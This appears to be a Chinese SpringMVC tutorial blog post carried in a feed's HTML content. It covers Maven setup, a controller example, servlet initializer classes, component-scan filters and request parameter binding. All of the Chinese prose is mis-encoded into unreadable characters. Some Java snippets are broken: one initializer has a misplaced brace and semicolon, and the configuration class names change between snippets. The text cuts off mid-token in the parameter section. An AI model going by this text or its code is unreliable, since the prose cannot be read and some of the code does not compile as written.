        <content type="html"><![CDATA[<h2 id="SpringMVCç®€ä»‹"><a href="#SpringMVCç®€ä»‹" class="headerlink" title="SpringMVCç®€ä»‹"></a>SpringMVCç®€ä»‹</h2><h4 id="SpringMVCæ¦‚è¿°"><a href="#SpringMVCæ¦‚è¿°" class="headerlink" title="SpringMVCæ¦‚è¿°"></a>SpringMVCæ¦‚è¿°</h4><ol><li><p>SpringMVCæ˜¯ä¸€ç§åŸºäºJavaå®ç°MVCæ¨¡å‹çš„è½»é‡çº§Webæ¡†æ¶</p></li><li><p>ä¼˜ç‚¹</p><ol><li>ä½¿ç”¨ç®€å•ï¼Œå¼€å‘ä¾¿æ·ï¼ˆç›¸æ¯”äºServletï¼‰</li><li>çµæ´»æ€§å¼º</li></ol></li><li><p>MVCæ¨¡å¼</p><p><img src="/2022/04/04/springmvc-yi/image-20220404115205366.png"></p><blockquote><p>View+Modelå°±æ˜¯é¡µé¢</p><p>controllerè°ƒç”¨serviceï¼Œserviceè°ƒç”¨dao</p></blockquote><p>æ¼”åŒ–åˆ°ç°åœ¨å˜æˆå¼‚æ­¥è°ƒç”¨</p></li></ol><p><img src="/2022/04/04/springmvc-yi/image-20210804185234370.png"></p><ul><li><p>daoï¼šè´Ÿè´£æ•°æ®çš„æŒä¹…åŒ–ï¼Œå­˜å‚¨ä¸€äº›ä¸œè¥¿</p></li><li><p>ä½¿ç”¨jsonè¿›è¡Œå‰åç«¯äº¤äº’</p></li></ul><h4 id="å®ç°SpringMVCæ¡ˆä¾‹"><a href="#å®ç°SpringMVCæ¡ˆä¾‹" class="headerlink" title="å®ç°SpringMVCæ¡ˆä¾‹"></a>å®ç°SpringMVCæ¡ˆä¾‹</h4><ul><li><p>ã€ç¬¬ä¸€æ­¥ã€‘åˆ›å»ºwebå·¥ç¨‹ï¼ˆMavenç»“æ„ï¼‰</p></li><li><p>ã€ç¬¬äºŒæ­¥ã€‘è®¾ç½®tomcatæœåŠ¡å™¨ï¼ŒåŠ è½½webå·¥ç¨‹(tomcatæ’ä»¶ï¼‰</p></li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.tomcat.maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>tomcat7-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">&gt;</span></span>80<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>path</span><span class="token punctuation">&gt;</span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>path</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ã€ç¬¬ä¸‰æ­¥ã€‘å¯¼å…¥åæ ‡ï¼ˆSpringMVC+Servletï¼‰</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>javax.servlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>javax.servlet-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>provided<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-webmvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.2.10.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ã€ç¬¬å››æ­¥ã€‘å®šä¹‰å¤„ç†è¯·æ±‚çš„åŠŸèƒ½ç±»ï¼ˆUserControllerï¼‰</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//å®šä¹‰è¡¨ç°å±‚æ§åˆ¶å™¨bean</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">{</span>    <span class="token comment">//è®¾ç½®æ˜ å°„è·¯å¾„ä¸º/saveï¼Œå³å¤–éƒ¨è®¿é—®è·¯å¾„</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/save"</span><span class="token punctuation">)</span>    <span class="token comment">//è®¾ç½®å½“å‰æ“ä½œè¿”å›ç»“æœä¸ºæŒ‡å®šjsonæ•°æ®ï¼ˆæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ä¿¡æ¯ï¼‰</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'info':'springmvc'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>å¯¹äºSpringMVCè€Œè¨€ï¼ŒControlleræ–¹æ³•è¿”å›å€¼é»˜è®¤è¡¨ç¤ºè¦è·³è½¬çš„é¡µé¢ï¼Œæ²¡æœ‰å¯¹åº”çš„é¡µé¢å°±ä¼šæŠ¥é”™ã€‚å¦‚æœä¸æƒ³è·³è½¬é¡µé¢è€Œæ˜¯å“åº”æ•°æ®ï¼Œé‚£ä¹ˆå°±éœ€è¦åœ¨æ–¹æ³•ä¸Šä½¿ç”¨@ResponseBodyæ³¨è§£ã€‚</p></blockquote><ul><li>ã€ç¬¬äº”æ­¥ã€‘ç¼–å†™SpringMVCé…ç½®ç±»ï¼ŒåŠ è½½å¤„ç†è¯·æ±‚çš„Beanã€‚</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//springmvcé…ç½®ç±»ï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªspringé…ç½®ç±»</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.yang"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Configure</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ã€ç¬¬å…­æ­¥ã€‘åŠ è½½SpringMVCé…ç½®ï¼Œå¹¶è®¾ç½®SpringMVCè¯·æ±‚æ‹¦æˆªçš„è·¯å¾„</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//webå®¹å™¨é…ç½®ç±»</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletContainersInitConfig</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractDispatcherServletInitializer</span> <span class="token punctuation">{</span>    <span class="token comment">//åŠ è½½springmvcé…ç½®ç±»ï¼Œäº§ç”Ÿspringmvcå®¹å™¨ï¼ˆæœ¬è´¨è¿˜æ˜¯springå®¹å™¨ï¼‰</span>    <span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createServletApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//åˆå§‹åŒ–WebApplicationContextå¯¹è±¡</span>        <span class="token class-name">AnnotationConfigWebApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//åŠ è½½æŒ‡å®šé…ç½®ç±»</span>        ctx<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">SpringMvcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ctx<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//è®¾ç½®ç”±springmvcæ§åˆ¶å™¨å¤„ç†çš„è¯·æ±‚æ˜ å°„è·¯å¾„</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//åŠ è½½springé…ç½®ç±»</span>    <span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createRootApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>AbstractDispatcherServletInitializerç±»</strong></p><ul><li><p>AbstractDispatcherServletInitializerç±»æ˜¯SpringMVCæä¾›çš„å¿«é€Ÿåˆå§‹åŒ–Web3.0å®¹å™¨çš„æŠ½è±¡ç±»</p></li><li><p>AbstractDispatcherServletInitializeræä¾›ä¸‰ä¸ªæ¥å£æ–¹æ³•ä¾›ç”¨æˆ·å®ç°</p><ul><li>createServletApplicationContext()æ–¹æ³•ï¼Œåˆ›å»ºServletå®¹å™¨æ—¶ï¼ŒåŠ è½½SpringMVCå¯¹åº”çš„beanå¹¶æ”¾å…¥WebApplicationContextå¯¹è±¡èŒƒå›´ä¸­ï¼Œè€ŒWebApplicationContextçš„ä½œç”¨èŒƒå›´ä¸ºServletContextèŒƒå›´ï¼Œå³æ•´ä¸ªwebå®¹å™¨èŒƒå›´ã€‚</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//åŠ è½½springmvcé…ç½®ç±»ï¼Œäº§ç”Ÿspringmvcå®¹å™¨ï¼ˆæœ¬è´¨è¿˜æ˜¯springå®¹å™¨ï¼‰</span><span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createServletApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">AnnotationConfigWebApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ctx<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">Configure</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ctx<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>getServletMappings()æ–¹æ³•ï¼Œè®¾å®šSpringMVCå¯¹åº”çš„è¯·æ±‚æ˜ å°„è·¯å¾„ï¼Œè®¾ç½®ä¸º/è¡¨ç¤ºæ‹¦æˆªæ‰€æœ‰è¯·æ±‚ï¼Œä»»æ„è¯·æ±‚éƒ½å°†è½¬å…¥åˆ°SpringMVCè¿›è¡Œå¤„ç†ã€‚</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//è®¾ç½®ç”±springmvcæ§åˆ¶å™¨å¤„ç†çš„è¯·æ±‚æ˜ å°„è·¯å¾„</span><span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/"</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>createRootApplicationContext()æ–¹æ³•ï¼Œå¦‚æœåˆ›å»ºServletå®¹å™¨æ—¶éœ€è¦åŠ è½½éSpringMVCå¯¹åº”çš„beanï¼Œä½¿ç”¨å½“å‰æ–¹æ³•è¿›è¡Œï¼Œä½¿ç”¨æ–¹å¼åŒcreateServletApplicationContext()</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//åŠ è½½springé…ç½®ç±»</span><span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createRootApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="æ¡ˆä¾‹å·¥ä½œæµç¨‹åˆ†æ"><a href="#æ¡ˆä¾‹å·¥ä½œæµç¨‹åˆ†æ" class="headerlink" title="æ¡ˆä¾‹å·¥ä½œæµç¨‹åˆ†æ"></a>æ¡ˆä¾‹å·¥ä½œæµç¨‹åˆ†æ</h4><p><strong>å¯åŠ¨æœåŠ¡å™¨åˆå§‹åŒ–è¿‡ç¨‹</strong></p><ol><li>æœåŠ¡å™¨å¯åŠ¨ï¼Œæ‰§è¡ŒServletContainersInitConfigç±»ï¼Œåˆå§‹åŒ–webå®¹å™¨</li><li>æ‰§è¡ŒcreateServletApplicationContextæ–¹æ³•ï¼Œåˆ›å»ºäº†WebApplicationContextå¯¹è±¡</li><li>åŠ è½½SpringMvcConfigé…ç½®ç±»</li><li>æ‰§è¡Œ@ComponentScanåŠ è½½å¯¹åº”çš„bean</li><li>åŠ è½½UserControllerï¼Œæ¯ä¸ª@RequestMappingçš„åç§°å¯¹åº”ä¸€ä¸ªå…·ä½“çš„æ–¹æ³•</li><li>æ‰§è¡ŒgetServletMappingsæ–¹æ³•ï¼Œå®šä¹‰æ‰€æœ‰çš„è¯·æ±‚éƒ½é€šè¿‡SpringMVC</li></ol><p><img src="/2022/04/04/springmvc-yi/image-20210804193122709.png"></p><p><strong>å•æ¬¡è¯·æ±‚è¿‡ç¨‹</strong></p><ol><li>å‘é€è¯·æ±‚localhost/save</li><li>webå®¹å™¨å‘ç°æ‰€æœ‰è¯·æ±‚éƒ½ç»è¿‡SpringMVCï¼Œå°†è¯·æ±‚äº¤ç»™SpringMVCå¤„ç†</li><li>è§£æè¯·æ±‚è·¯å¾„/save</li><li>ç”±/saveåŒ¹é…æ‰§è¡Œå¯¹åº”çš„æ–¹æ³•save(ï¼‰</li><li>æ‰§è¡Œsave()</li><li>æ£€æµ‹åˆ°æœ‰@ResponseBodyç›´æ¥å°†save()æ–¹æ³•çš„è¿”å›å€¼ä½œä¸ºå“åº”æ±‚ä½“è¿”å›ç»™è¯·æ±‚æ–¹</li></ol><h4 id="ControlleråŠ è½½æ§åˆ¶"><a href="#ControlleråŠ è½½æ§åˆ¶" class="headerlink" title="ControlleråŠ è½½æ§åˆ¶"></a>ControlleråŠ è½½æ§åˆ¶</h4><p>é¿å…Springé”™è¯¯çš„åŠ è½½åˆ°SpringMVCçš„bean</p><p><strong>ControlleråŠ è½½æ§åˆ¶ä¸ä¸šåŠ¡beanåŠ è½½æ§åˆ¶</strong></p><ul><li><p>SpringMVCç›¸å…³beanï¼ˆè¡¨ç°å±‚beanï¼‰</p></li><li><p>Springæ§åˆ¶çš„bean</p><ol><li><p>ä¸šåŠ¡beanï¼ˆServiceï¼‰</p></li><li><p>åŠŸèƒ½beanï¼ˆDataSourceç­‰ï¼‰</p></li></ol></li><li><p>SpringMVCç›¸å…³beanåŠ è½½æ§åˆ¶</p><ol><li>SpringMVCåŠ è½½çš„beanå¯¹åº”çš„åŒ…å‡åœ¨com.yang.controlleråŒ…å†…</li></ol></li><li><p>Springç›¸å…³beanåŠ è½½æ§åˆ¶</p><ol><li>æ–¹å¼ä¸€ï¼šSpringåŠ è½½çš„beanè®¾å®šæ‰«æèŒƒå›´ä¸ºcom.yangï¼Œæ’é™¤æ‰controlleråŒ…å†…çš„bean</li><li>æ–¹å¼äºŒï¼šSpringåŠ è½½çš„beanè®¾å®šæ‰«æèŒƒå›´ä¸ºç²¾å‡†èŒƒå›´ï¼Œä¾‹å¦‚serviceåŒ…ã€daoåŒ…ç­‰</li><li>æ–¹å¼ä¸‰ï¼šä¸åŒºåˆ†Springä¸SpringMVCçš„ç¯å¢ƒï¼ŒåŠ è½½åˆ°åŒä¸€ä¸ªç¯å¢ƒä¸­ï¼ˆä¸å¸¸ç”¨ï¼‰</li></ol></li></ul><p><strong>ä»£ç å®ç°</strong></p><ul><li>åç§°ï¼š@ComponentScan</li><li>ç±»å‹ï¼šç±»æ³¨è§£</li><li>èŒƒä¾‹</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"com.yang"</span><span class="token punctuation">,</span>               excludeFilters <span class="token operator">=</span> <span class="token annotation punctuation">@ComponentScan.Filter</span><span class="token punctuation">(</span>                   type <span class="token operator">=</span> <span class="token class-name">FilterType</span><span class="token punctuation">.</span>ANNOTATION<span class="token punctuation">,</span><span class="token comment">//æ’é™¤æ³¨è§£</span>                   classes <span class="token operator">=</span> <span class="token class-name">Controller</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token comment">//æ’é™¤Controlleræ³¨è§£</span>               <span class="token punctuation">)</span>              <span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>å±æ€§<ol><li>excludeFiltersï¼šæ’é™¤æ‰«æè·¯å¾„ä¸­åŠ è½½çš„beanï¼Œéœ€è¦æŒ‡å®šç±»åˆ«ï¼ˆtypeï¼‰ä¸å…·ä½“é¡¹ï¼ˆclassesï¼‰</li><li>includeFiltersï¼šåŠ è½½æŒ‡å®šçš„beanï¼Œéœ€è¦æŒ‡å®šç±»åˆ«ï¼ˆtypeï¼‰ä¸å…·ä½“é¡¹ï¼ˆclassesï¼‰</li></ol></li></ul><h4 id="Beançš„åŠ è½½æ ¼å¼"><a href="#Beançš„åŠ è½½æ ¼å¼" class="headerlink" title="Beançš„åŠ è½½æ ¼å¼"></a>Beançš„åŠ è½½æ ¼å¼</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletContainersInitConfig</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractDispatcherServletInitializer</span> <span class="token punctuation">{</span>     <span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createServletApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token class-name">AnnotationConfigWebApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">Configure</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ctx<span class="token punctuation">;</span>      <span class="token punctuation">}</span>       <span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createRootApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token class-name">AnnotationConfigWebApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              ctx<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> ctx<span class="token punctuation">;</span>      <span class="token punctuation">}</span>       <span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ç®€åŒ–æ ¼å¼</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletContainersInitConfig</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractAnnotationConfigDispatcherServletInitializer</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">SpringMvcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getRootConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‚æ•°ä¼ é€’"><a href="#å‚æ•°ä¼ é€’" class="headerlink" title="å‚æ•°ä¼ é€’"></a>å‚æ•°ä¼ é€’</h2><h4 id="äº”ç§ç±»å‹å‚æ•°ä»‹ç»"><a href="#äº”ç§ç±»å‹å‚æ•°ä»‹ç»" class="headerlink" title="äº”ç§ç±»å‹å‚æ•°ä»‹ç»"></a>äº”ç§ç±»å‹å‚æ•°ä»‹ç»</h4><ul><li>æ™®é€šå‚æ•°</li><li>POJOç±»å‹å‚æ•°</li><li>åµŒå¥—POJOç±»å‹å‚æ•°</li><li>æ•°ç»„ç±»å‹å‚æ•°</li><li>é›†åˆç±»å‹å‚æ•°</li></ul><p><strong>æ™®é€šå‚æ•°</strong></p><ul><li>æ™®é€šå‚æ•°ï¼šå½“è¯·æ±‚å‚æ•°åä¸å½¢å‚å˜é‡åä¸åŒï¼Œä½¿ç”¨@RequestParamç»‘å®šå‚æ•°å…³ç³»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//æ™®é€šå‚æ•°ï¼šè¯·æ±‚å‚æ•°åä¸å½¢å‚åä¸åŒæ—¶ï¼Œä½¿ç”¨@RequestParamæ³¨è§£å…³è”è¯·æ±‚å‚æ•°åç§°ä¸å½¢å‚åç§°ä¹‹é—´çš„å…³ç³»</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/commonParamDifferentName"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">commonParamDifferentName</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> userName <span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token comment">//ç½‘å€çš„nameæ˜ å°„åˆ°username</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token 